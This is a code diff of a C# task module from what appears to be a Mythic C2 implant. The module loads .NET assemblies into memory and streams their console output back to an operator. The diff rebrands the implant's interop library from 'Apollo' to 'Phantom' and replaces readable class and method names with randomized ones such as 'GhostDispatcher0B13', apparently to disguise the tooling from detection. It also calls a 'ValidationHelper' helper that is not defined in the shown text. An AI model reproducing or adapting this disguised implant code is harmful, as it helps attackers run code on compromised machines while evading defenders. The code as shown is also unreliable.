@@ -8,9 +8,9 @@
 
 using System;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
 using System.IO;
@@ -19,15 +19,15 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Security.Principal;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Utils;
 
 namespace Tasks
 {
-    public class inline_assembly : Tasking
+    public class GhostDispatcher0B13 : Tasking
     {
         [DataContract]
-        internal struct InlineAssemblyParameters
+        internal struct OptimizedManager135C
         {
             [DataMember(Name = "assembly_name")]
             public string AssemblyName;
@@ -91,7 +91,7 @@ namespace Tasks
                     accumOut = _output;
                     slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
                     lastOutLen = accumOut.Length;
-                    if (!string.IsNullOrEmpty(slicedOut))
+                    if (!ValidationHelper.IsStringEmpty(slicedOut))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                             slicedOut,
@@ -101,7 +101,7 @@ namespace Tasks
                 }
                 
                 slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
-                if (!string.IsNullOrEmpty(slicedOut))
+                if (!ValidationHelper.IsStringEmpty(slicedOut))
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                         slicedOut,
@@ -186,7 +186,7 @@ namespace Tasks
                 {
                     if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                     {
-                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
+                        string[] stringData = ValidationHelper.IsStringEmpty(parameters.AssemblyArguments)
                             ? new string[0]
                             : ParseCommandLine(parameters.AssemblyArguments);
                         
@@ -208,7 +208,7 @@ namespace Tasks
                 }
                 else
                 {
-                    resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
+                    resp = CreateTaskResponse("Failed to get PhantomInterop dependency.", true, "error");
                 }
             }
             catch (Exception ex)
@@ -329,7 +329,7 @@ namespace Tasks
             }
         }
         
-        private static void UnloadAppDomain(AppDomain oDomain)
+        private static void ShadowGatewayC083(AppDomain oDomain)
         {
             AppDomain.Unload(oDomain);
         }
@@ -342,7 +342,7 @@ namespace Tasks
                 Assembly interop2 = null;
                 foreach (var asm2 in AppDomain.CurrentDomain.GetAssemblies())
                 {
-                    if (asm2.FullName.StartsWith("ApolloInterop"))
+                    if (asm2.FullName.StartsWith("PhantomInterop"))
                     {
                         interop2 = asm2;
                         break;
@@ -352,10 +352,10 @@ namespace Tasks
                 {
                     return;
                 }
-                Type tStringEventArgs = interop2.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
+                Type tStringEventArgs = interop2.GetType("PhantomInterop.Classes.Events.StringDataEventArgs");
                 FieldInfo fiData = tStringEventArgs.GetField("Data");
                 string data = fiData.GetValue(args) as string;
-                if (!string.IsNullOrEmpty(data))
+                if (!ValidationHelper.IsStringEmpty(data))
                 {
                     _output += data;
                 }
@@ -363,7 +363,7 @@ namespace Tasks
             Assembly interopAsm = null;
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (asm.FullName.StartsWith("ApolloInterop"))
+                if (asm.FullName.StartsWith("PhantomInterop"))
                 {
                     interopAsm = asm;
                 }
@@ -380,7 +380,7 @@ namespace Tasks
             var callbackMethod = (EventHandler<EventArgs>)OnWrite;
             
             
-            Type tWriter = interopAsm.GetType("ApolloInterop.Classes.IO.EventableStringWriter");
+            Type tWriter = interopAsm.GetType("PhantomInterop.Classes.IO.EventableStringWriter");
 
             var writer = Activator.CreateInstance(tWriter);
             EventInfo eiWrite = tWriter.GetEvent("BufferWritten");
@@ -393,7 +393,7 @@ namespace Tasks
             Console.SetError((StringWriter)writer);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
+                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Phantom"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
